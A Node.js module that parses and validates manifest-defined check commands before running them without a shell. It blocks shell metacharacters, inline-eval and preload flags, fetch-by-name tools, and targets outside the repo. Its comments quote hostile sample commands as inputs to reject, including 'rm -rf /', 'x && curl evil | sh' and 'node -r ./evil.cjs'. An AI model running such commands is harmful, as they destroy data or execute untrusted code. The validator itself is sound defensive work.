#!/usr/bin/env node
// Safe command execution for check/routine manifests.
//
// Check and routine `command` strings are repo-owned, but the product thesis is
// that the wiki/checks are a *reviewed contributor surface*. Running those
// strings through a shell (`spawnSync(cmd, { shell: true })`) turns any PR that
// edits checks/manifest.json into arbitrary code execution on the reviewer's
// machine, and the Stop-hook loop runs them automatically.
//
// The allow-list is a list of trusted PROGRAMS, not safe BEHAVIOURS: node,
// python, deno and friends can each evaluate arbitrary inline code, and npx /
// make / ts-node run code fetched or named on the command line rather than a
// reviewed in-repo file. So beyond tokenising the command, rejecting shell
// metacharacters, and allow-listing the executable, this module:
//   1. rejects any control character (newline/tab/CR), quoted or not, so a
//      command is always a single space-separated line and cannot smuggle a
//      second invocation past the whitespace split;
//   2. rejects flags that run code other than the reviewed positional file —
//      inline eval (node -e/--eval/-p/--print, python -c, deno eval) AND
//      preload/loader/module injection (node -r/--require/--loader/
//      --experimental-loader/--import/--preload, python -m) — because pairing
//      such a flag with a harmless positional script is still arbitrary code;
//   3. rejects fetch/run-by-name tools (npx, make, deno, ts-node, tsx) by
//      default — they run code that was never a reviewed in-repo file;
//   4. requires the file-referencing interpreters (node, bun, python) to name
//      an existing file resolved INSIDE the repo root.
// Each of (2)-(4) can be opted out per executable basename via
// PRODUCT_WIKI_ALLOWED_COMMANDS (comma-separated) for unusual stacks; the
// shell-metachar/expansion rejection always applies. This narrows the trust
// boundary; it does not eliminate it — review manifest changes like code.
//
// Legitimate commands ("node --test --test-name-pattern='^ac.calc.add$' test/x.js",
// "node scripts/wiki-lint.mjs", "go test ./...") validate; "rm -rf /",
// "x && curl evil | sh", "$(...)", "node -e <code>", "npx <pkg>" do not.

import fs from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";

// Default allow-list: test runners, package managers, compilers, language
// runtimes. Deliberately excludes shells (sh/bash/zsh) and anything that would
// re-open arbitrary execution. Extend per-repo with PRODUCT_WIKI_ALLOWED_COMMANDS
// (comma-separated executable basenames) for unusual stacks.
const DEFAULT_ALLOWED = [
  "node", "npm", "npx", "pnpm", "yarn", "bun", "deno",
  "vitest", "jest", "mocha", "ava", "tap", "tape",
  "tsc", "tsx", "ts-node",
  "python", "python3", "pytest",
  "go", "cargo", "make",
  "eslint", "biome", "prettier",
];

// Interpreters that execute inline code via a flag (so a check could run
// arbitrary code without ever naming a reviewed file).
const NODE_FAMILY = new Set(["node", "bun"]);
// Flags that run code OTHER than the reviewed positional file: inline eval and,
// crucially, preload/loader injection. -r/--require/--loader/--experimental-loader
// run an attacker-named module before/around the "real" file, so pairing them
// with a harmless positional script (e.g. `node -r ./evil.cjs scripts/lint.mjs`)
// is a full RCE. All are rejected by default.
const NODE_CODE_FLAGS = new Set([
  "-e", "--eval", "-p", "--print", "--import",
  "-r", "--require", "--loader", "--experimental-loader", "--preload",
]);
const PYTHON_FAMILY = new Set(["python", "python3"]);
// -c is inline eval; -m runs an arbitrary module by name (the python analogue of
// npx). Use the allow-listed `pytest`/runner binaries directly instead.
const PYTHON_CODE_FLAGS = new Set(["-c", "--command", "-m"]);
const DENO_FAMILY = new Set(["deno"]);
const DENO_CODE_FLAGS = new Set(["-e", "--eval", "--eval-print"]);

// Interpreters that must run an existing in-repo file (so the executed code is
// a reviewed artifact, not inline or fetched).
const FILE_REFERENCING_INTERPRETERS = new Set([...NODE_FAMILY, ...PYTHON_FAMILY]);

// Tools that fetch or run code by name/URL rather than a reviewed in-repo file.
const FETCH_RUN_BY_NAME = new Set(["npx", "make", "deno", "ts-node", "tsx"]);

// Flags that consume the following token as their value, so that value is not
// mistaken for the file the interpreter runs.
// Flags whose following token is a value, not the executed file. The
// code-injecting -r/--require/--loader/--experimental-loader and python -m are
// deliberately NOT here — they are rejected outright by *_CODE_FLAGS above.
const NODE_VALUE_FLAGS = new Set([
  "--test-name-pattern", "--test-reporter", "--test-reporter-destination",
  "--conditions", "-C", "--title",
]);
const PYTHON_VALUE_FLAGS = new Set(["-W", "-X"]);

export function allowedCommands() {
  const extra = (process.env.PRODUCT_WIKI_ALLOWED_COMMANDS || "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);
  return new Set([...DEFAULT_ALLOWED, ...extra]);
}

function envOptedIn() {
  return new Set(
    (process.env.PRODUCT_WIKI_ALLOWED_COMMANDS || "")
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean),
  );
}

function isControlChar(ch) {
  const c = ch.charCodeAt(0);
  return c < 0x20 || c === 0x7f;
}

function normaliseBin(arg) {
  return path.basename(arg).replace(/\.(cmd|exe|bat)$/i, "");
}

// True when `arg` names an existing regular file resolved inside the repo root
// (no `..`/absolute escape).
function referencesInRepoFile(arg, root) {
  if (typeof arg !== "string" || !arg || arg.startsWith("-")) return false;
  const resolved = path.resolve(root, arg);
  const rel = path.relative(root, resolved);
  if (rel === "" || rel.startsWith("..") || path.isAbsolute(rel)) return false;
  try {
    if (!fs.statSync(resolved).isFile()) return false;
    // Resolve symlinks: a symlink inside the tree pointing at an out-of-repo
    // target must not satisfy the in-repo-file requirement.
    const real = fs.realpathSync(resolved);
    const realRel = path.relative(fs.realpathSync(root), real);
    return realRel !== "" && !realRel.startsWith("..") && !path.isAbsolute(realRel);
  } catch {
    return false;
  }
}

function hasInRepoFileTarget(argv, bin, root) {
  const valueFlags = PYTHON_FAMILY.has(bin) ? PYTHON_VALUE_FLAGS : NODE_VALUE_FLAGS;
  for (let i = 1; i < argv.length; i += 1) {
    const token = argv[i];
    if (token.startsWith("-")) {
      if (!token.includes("=") && valueFlags.has(token)) i += 1; // skip the flag's value
      continue;
    }
    if (referencesInRepoFile(token, root)) return true;
  }
  return false;
}

const SHELL_METACHARS = new Set(["&", "|", ";", "<", ">", "`", "(", ")", "{", "}", "\n", "*", "?", "!"]);

// Tokenise a command string the way a POSIX shell would for simple invocations,
// honouring single/double quotes and backslash escapes, but throwing on any
// unquoted shell metacharacter, expansion, or control character. Tokens are
// separated only by a literal space. Returns an argv array.
export function parseCommand(cmd) {
  if (typeof cmd !== "string") throw new Error("command must be a string");
  const tokens = [];
  let cur = "";
  let hasCur = false;
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < cmd.length; i += 1) {
    const ch = cmd[i];

    if (isControlChar(ch)) {
      throw new Error(
        `command contains a control character (0x${ch.charCodeAt(0).toString(16).padStart(2, "0")}). ` +
          `Checks must be a single line with space-separated tokens. Got: ${JSON.stringify(cmd)}`,
      );
    }

    if (inSingle) {
      if (ch === "'") inSingle = false;
      else cur += ch; // everything literal inside single quotes
      hasCur = true;
      continue;
    }

    if (inDouble) {
      if (ch === '"') {
        inDouble = false;
      } else if (ch === "\\" && '"\\$`'.includes(cmd[i + 1])) {
        cur += cmd[i + 1];
        i += 1;
      } else if (ch === "$" || ch === "`") {
        throw new Error(`command contains a shell expansion (${ch}); not allowed: ${cmd}`);
      } else {
        cur += ch;
      }
      hasCur = true;
      continue;
    }

    if (ch === "'") { inSingle = true; hasCur = true; continue; }
    if (ch === '"') { inDouble = true; hasCur = true; continue; }
    if (ch === "$") throw new Error(`command contains a shell expansion ($); not allowed: ${cmd}`);
    if (ch === "\\") {
      if (i + 1 < cmd.length) { cur += cmd[i + 1]; i += 1; hasCur = true; }
      continue;
    }
    if (ch === " ") {
      if (hasCur) { tokens.push(cur); cur = ""; hasCur = false; }
      continue;
    }
    if (SHELL_METACHARS.has(ch)) {
      throw new Error(
        `command contains unsupported shell metacharacter "${ch}". ` +
          `Checks must be a single program invocation (no &&, |, ;, redirects, globs, or $()). Got: ${cmd}`,
      );
    }
    cur += ch;
    hasCur = true;
  }

  if (inSingle || inDouble) throw new Error(`unterminated quote in command: ${cmd}`);
  if (hasCur) tokens.push(cur);
  return tokens;
}

// Validate a command without running it. Returns { ok, argv?, error? }.
export function validateCommand(cmd, allowed = allowedCommands(), root = process.cwd()) {
  let argv;
  try {
    argv = parseCommand(cmd);
  } catch (error) {
    return { ok: false, error: error.message };
  }
  if (argv.length === 0) return { ok: false, error: "empty command" };
  const bin = normaliseBin(argv[0]);
  if (!allowed.has(bin)) {
    return {
      ok: false,
      error:
        `command not allowed: "${argv[0]}". Allowed executables: ${[...allowed].sort().join(", ")}. ` +
        `Set PRODUCT_WIKI_ALLOWED_COMMANDS to extend.`,
    };
  }

  const optedIn = envOptedIn();

  if (FETCH_RUN_BY_NAME.has(bin) && !optedIn.has(bin)) {
    return {
      ok: false,
      error:
        `command not allowed: "${bin}" fetches or runs code by name/URL rather than a reviewed in-repo file. ` +
        `Run a checked-in script instead, or opt in per repo with PRODUCT_WIKI_ALLOWED_COMMANDS=${bin}.`,
    };
  }

  if (!optedIn.has(bin)) {
    let codeFlags = null;
    if (NODE_FAMILY.has(bin)) codeFlags = NODE_CODE_FLAGS;
    else if (PYTHON_FAMILY.has(bin)) codeFlags = PYTHON_CODE_FLAGS;
    else if (DENO_FAMILY.has(bin)) codeFlags = DENO_CODE_FLAGS;
    if (codeFlags) {
      for (const token of argv.slice(1)) {
        const flag = token.includes("=") ? token.slice(0, token.indexOf("=")) : token;
        if (codeFlags.has(flag)) {
          return {
            ok: false,
            error:
              `command not allowed: "${bin} ${flag} ..." runs code outside the reviewed file ` +
              `(inline eval, a preload, or a loader/module run by name). ` +
              `Point the check at a real file, or opt in with PRODUCT_WIKI_ALLOWED_COMMANDS=${bin}.`,
          };
        }
      }
    }
  }

  if (FILE_REFERENCING_INTERPRETERS.has(bin) && !optedIn.has(bin) && !hasInRepoFileTarget(argv, bin, root)) {
    return {
      ok: false,
      error:
        `command not allowed: "${bin}" must run an existing in-repo file ` +
        `(e.g. "node scripts/foo.mjs" or "node --test tests/foo.test.js"). ` +
        `No in-repo file was referenced in "${cmd}". To override, set PRODUCT_WIKI_ALLOWED_COMMANDS=${bin}.`,
    };
  }

  return { ok: true, argv };
}

// Run a command safely (shell: false). On a parse/allow-list failure returns a
// result-shaped object with status 1 and the error on stderr, so existing
// callers that check `result.status` keep working.
export function runCommand(cmd, options = {}) {
  const root = options.cwd || process.cwd();
  const check = validateCommand(cmd, allowedCommands(), root);
  if (!check.ok) {
    if (options.stdio === "inherit") process.stderr.write(`${check.error}\n`);
    return { status: 1, error: check.error, stdout: "", stderr: `${check.error}\n` };
  }
  const [bin, ...rest] = check.argv;
  return spawnSync(bin, rest, { shell: false, ...options });
}
